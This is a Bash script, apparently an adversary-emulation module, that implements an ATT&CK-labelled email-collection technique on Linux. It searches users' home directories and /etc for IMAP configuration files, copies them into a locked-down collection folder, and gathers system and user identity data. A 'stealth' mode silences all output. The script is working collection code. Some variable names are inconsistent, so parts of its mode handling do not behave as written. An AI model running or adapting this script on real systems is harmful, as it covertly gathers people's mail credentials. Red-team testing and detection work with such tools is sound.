
    # ===== VARIABLES ESSENTIELLES COLLECTION =====
    export T1114_005B_DEBUG_MODE="${T1114_005B_DEBUG_MODE:-false}"
    export T1114_005B_TIMEOUT="${T1114_005B_TIMEOUT:-300}"
    export T1114_005B_FALLBACK_MODE="${T1114_005B_FALLBACK_MODE:-real}"
    export T1114_005B_OUTPUT_FORMAT="${T1114_005B_OUTPUT_FORMAT:-json}"
    export T1114_005B_POLICY_CHECK="${T1114_005B_POLICY_CHECK:-true}"
    export T1114_005B_MAX_FILES="${T1114_005B_MAX_FILES:-200}"
    export T1114_005B_MAX_FILE_SIZE="${T1114_005B_MAX_FILE_SIZE:-1048576}"
    export T1114_005B_SCAN_DEPTH="${T1114_005B_SCAN_DEPTH:-3}"
    export T1114_005B_EXCLUDE_CACHE="${T1114_005B_EXCLUDE_CACHE:-true}"
    export T1114_005B_CAPTURE_DURATION="${T1114_005B_CAPTURE_DURATION:-60}"
    # ===== FIN VARIABLES COLLECTION =====

#!/bin/bash

# T1114.005b - Email Collection: IMAP Config Files Linux
# MITRE ATT&CK Enterprise - Collection Tactic (TA0009)
# ATOMIC ACTION: Extract IMAP configuration files ONLY
# Platform: Linux | Architecture: 4 orchestrators + auxiliary functions

Check-CriticalDeps() { 
    for cmd in bash jq bc grep find stat; do 
        command -v "$cmd" >/dev/null || { 
            [[ "${TT1114_005B_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[ERROR] Missing dependency: $cmd"; exit 1; 
        }
    done
}

Load-EnvironmentVariables() {
    export TT1114_005B_OUTPUT_BASE="${TT1114_005B_OUTPUT_BASE:-./mitre_results}"
    export TT1114_005B_TIMEOUT="${TT1114_005B_TIMEOUT:-300}"
    export TT1114_005B_OUTPUT_MODE="${TT1114_005B_OUTPUT_MODE:-simple}"
    export TT1114_005B_SILENT_MODE="${TT1114_005B_SILENT_MODE:-false}"
    export T1114_005B_MAX_FILES="${T1114_005B_MAX_FILES:-50}"
    
    export T1114_005B_CONFIG_PATHS="${T1114_005B_CONFIG_PATHS:-/home/*/.imaprc,/etc/imapd_conf}"
    export T1114_005B_CONFIG_PATTERNS="${T1114_005B_CONFIG_PATTERNS:-*.imaprc,*.conf,*_cfg}"
    export T1114_005B_MAX_FILE_SIZE="${T1114_005B_MAX_FILE_SIZE:-1048576}"
}

Validate-SystemPreconditions() {
    [[ -z "$TT1114_005B_OUTPUT_BASE" ]] && { [[ "${TT1114_005B_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[ERROR] T1114_005B_OUTPUT_BASE not set"; return 1; }
    [[ ! -w "$(dirname "$TT1114_005B_OUTPUT_BASE")" ]] && { [[ "${TT1114_005B_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[ERROR] Output directory not writable"; return 1; }
    return 0
}

Initialize-OutputStructure() {
    local timestamp=$(date +%Y%m%d_%H%M%S)
    export COLLECTION_DIR="$TT1114_005B_OUTPUT_BASE/T1114_005b_imap_config_$timestamp"
    mkdir -p "$COLLECTION_DIR"/{imap_configs,metadata} 2>/dev/null || return 1
    chmod 700 "$COLLECTION_DIR" 2>/dev/null
    echo "$COLLECTION_DIR"
}

Collect-IMAPConfigFile() {
    local file_path="$1" collection_dir="$2"
    
    [[ ! -f "$file_path" || ! -r "$file_path" ]] && return 1
    
    local file_size=$(stat -c%s "$file_path" 2>/dev/null || echo 0)
    [[ $file_size -gt $T1114_005B_MAX_FILE_SIZE ]] && return 1
    
    local filename=$(basename "$file_path")
    local safe_name="imap_config_${filename}_$(date +%s)"
    
    if cp "$file_path" "$collection_dir/imap_configs/$safe_name" 2>/dev/null; then
        echo "$file_path:$file_size"
        [[ "$TT1114_005B_SILENT_MODE" != "true" && "${TT1114_005B_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "  + Collected: $file_path ($file_size bytes)" >&2
        return 0
    fi
    return 1
}

Collect-SystemMetadata() {
    local collection_dir="$1"
    echo "$(uname -a)" > "$collection_dir/metadata/system_info.txt"
    echo "$(id)" > "$collection_dir/metadata/user_context.txt"
    echo "$(pwd)" > "$collection_dir/metadata/working_dir.txt"
}

Log-ExecutionMessage() {
    # Silent in stealth mode or when T1114_005B_SILENT_MODE is true
    [[ "$TT1114_005B_SILENT_MODE" != "true" && "${TT1114_005B_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "$1" >&2
}

Generate-SimpleOutput() {
    echo "IMAP CONFIG COLLECTION "
    echo "Files: $1"
    echo "Size: $2 bytes"
    echo "Complete"
}

Generate-DebugOutput() {
    local json_output=$(cat << EOF
{
    "@timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
    "technique": "T1114.005b",
    "results": {
        "files_collected": $1,
        "total_size_bytes": $2,
        "collection_directory": "$3"
    }
}
EOF
)
    echo "$json_output" > "$3/metadata/results.json"
    [[ "$TT1114_005B_SILENT_MODE" != "true" ]] && echo "$json_output"
}

Generate-StealthOutput() { echo "$1" > /dev/null 2>&1; }
Generate-NoneOutput() { :; }
# 4 MAIN ORCHESTRATORS (10-20 lines each)
Get-Configuration() {
    Check-CriticalDeps || exit 1
    Load-EnvironmentVariables
    Validate-SystemPreconditions || exit 1
    echo "$(Initialize-OutputStructure)"
}

Invoke-MicroTechniqueAction() {
    local collection_dir="$1"
    local collected_files=() total_size=0 file_count=0
    
    Log-ExecutionMessage "[INFO] Extracting IMAP config files..."
    
    IFS=',' read -ra config_paths <<< "$T1114_005B_CONFIG_PATHS"
    
    for config_path_pattern in "${config_paths[@]}"; do
        config_path_pattern=$(echo "$config_path_pattern" | xargs)
        
        for config_path in $config_path_pattern; do
            [[ ! -f "$config_path" ]] && continue
            
            if result=$(Collect-IMAPConfigFile "$config_path" "$collection_dir"); then
                IFS=':' read -r file_path file_size <<< "$result"
                collected_files+=("$file_path")
                total_size=$((total_size + file_size))
                ((file_count++))
                [[ $file_count -ge ${T1114_005B_MAX_FILES:-50} ]] && break
            fi
        done
    done
    
    Collect-SystemMetadata "$collection_dir"
    echo "$file_count:$total_size:$(IFS=,; echo "${collected_files[*]}")"
}

Write-StandardizedOutput() {
    case "${OUTPUT_MODE:-simple}" in
        "simple")  Generate-SimpleOutput "$2" "$3" "$1" ;;
        "debug")   Generate-DebugOutput "$2" "$3" "$1" ;;
        "stealth") Generate-StealthOutput "$2" ;;
        "none")    Generate-NoneOutput ;;
    esac
}

Main() {
    trap 'echo "[INTERRUPTED] Cleaning up..."; exit 130' INT TERM
    
    local collection_dir results
    collection_dir=$(Get-Configuration) || exit 2
    results=$(Invoke-MicroTechniqueAction "$collection_dir") || exit 1
    
    IFS=':' read -r files_collected total_size _ <<< "$results"
    Write-StandardizedOutput "$collection_dir" "$files_collected" "$total_size"
    
    Log-ExecutionMessage "[SUCCESS] Completed: $files_collected files collected"
    exit 0
}

Main "$@"